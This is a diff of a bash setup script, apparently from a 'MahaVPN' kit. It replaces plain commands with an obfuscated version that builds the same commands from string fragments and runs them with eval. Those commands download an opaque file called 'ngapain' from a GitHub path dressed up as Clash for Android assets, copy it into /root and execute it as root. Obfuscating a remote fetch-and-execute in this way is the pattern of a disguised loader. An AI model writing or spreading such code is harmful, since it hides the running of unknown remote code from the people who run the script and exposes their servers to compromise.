@@ -1,10 +1,8 @@
 #!/bin/bash
-#mahavpn
-#goodboy
-mkdir /root/vnstat
-wget -P /root/vnstat "https://raw.githubusercontent.com/GboyGud/clash_for_android/main/assets/ngapain"
-chmod +x /root/vnstat/ngapain
-cp /root/vnstat/ngapain /root/stat
-chmod +x /root/stat
-rm -r /root/vnstat
-bash /root/stat
+# Always Support MahaVPN
+# Join Channel - https://t.me/MahaVPN_Channel
+# Join Grup VIP Dengan Berlangganan VPN Premium, Link PM Telegram @AfthonPc
+
+z="
+";ez='n"';fz='chmo';oz='/vns';uz='tat';Bz='r /r';Iz='t/vn';vz='rm -';Zz='d/ma';iz='ot/v';Gz=' -P ';qz='ngap';sz='t/st';kz='t/ng';Sz='com/';mz='cp /';wz='bash';Vz='clas';Wz='h_fo';Uz='Gud/';pz='tat/';bz='sset';Qz='cont';hz=' /ro';Xz='r_an';nz='root';Mz='//ra';cz='s/ng';Yz='droi';gz='d +x';Az='mkdi';rz='ain ';Pz='user';Hz='/roo';Oz='thub';Fz='wget';Kz=' "ht';jz='nsta';Dz='vnst';Rz='ent.';Nz='w.gi';dz='apai';Cz='oot/';az='in/a';Tz='Gboy';tz='ot/s';Ez='at';Jz='stat';Lz='tps:';lz='n';
+eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$hz$iz$jz$kz$dz$lz$z$mz$nz$oz$pz$qz$rz$Hz$sz$Ez$z$fz$gz$hz$tz$uz$z$vz$Bz$Cz$Dz$Ez$z$wz$hz$tz$uz"
